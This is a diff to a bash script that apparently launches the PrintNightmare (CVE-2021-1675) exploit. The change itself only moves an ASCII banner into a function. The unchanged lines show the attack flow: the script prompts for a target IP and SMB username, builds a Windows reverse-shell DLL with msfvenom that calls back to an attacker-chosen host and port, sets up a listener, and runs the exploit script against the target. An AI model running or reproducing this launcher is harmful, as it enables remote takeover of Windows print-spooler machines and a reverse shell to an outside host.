@@ -2,16 +2,18 @@
 #  EDUCATIONAL PURPOSES ONLY
 
 banner() {
+	echo "    _____________"
+	echo "   /   Welcome   \"
+	echo "   !      To     !"
+	echo "   ! SpringsWood !"
+	echo "   \_____________/"
+	echo "         ! !"
+	echo "         ! !  =[ Freddy Krueger >"
+ 	echo "       \'! !'/ [ PrintNightmare Exploiter >"
+	echo ""
+}
 
-    _____________
-   /   Welcome   \
-   !      To     !
-   ! SpringsWood !
-   \_____________/
-         ! !
-         ! !  =[ Freddy Krueger >
-       \'! !'/ [ PrintNightmare Exploiter >
-
+banner
 echo -e "[*] Target IP Address"
 read -p "0=freddy(victim)> " target
 echo -e "[*] Target SMB Username: "
@@ -32,6 +34,7 @@ fi
 
 clear
 
+banner
 echo -e "[*] Creating Payload"
 sleep 1
 msfvenom -p windows/x64/reverse_shell_tcp LHOST=$ipaddr LPORT=$port -o elmStreet.dll
@@ -48,6 +51,7 @@ echo -e "[*] Listener Created (dreams.rc)"
 sleep 2
 clear
 
+banner
 if [ -f CVE-2021-1675.py ]
 then
 	read -r -p "[?] Run Exploit on $target" exploit
